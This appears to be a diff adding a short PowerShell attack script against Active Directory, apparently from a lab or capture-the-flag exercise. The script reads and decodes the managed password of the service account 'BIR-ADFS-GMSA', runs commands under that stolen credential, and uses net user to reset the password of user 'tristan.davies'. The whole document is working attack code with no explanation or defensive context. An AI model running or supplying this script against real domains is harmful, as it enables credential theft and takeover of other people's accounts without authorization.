@@ -1,0 +1,8 @@
+$gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA' -Properties 'msDS-ManagedPassword'
+$mp = $gmsa.'msDS-ManagedPassword'
+ConvertFrom-ADManagedPasswordBlob $mp
+
+$secpw = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
+$cred = New-Object System.Management.Automation.PScredential 'BIR-ADFS-GMSA',$secpw
+Invoke-Command -ComputerName localhost -Cred $cred -ScriptBlock { whoami }
+Invoke-Command -ComputerName localhost -Cred $cred -ScriptBlock { net user tristan.davies t4hack123! }
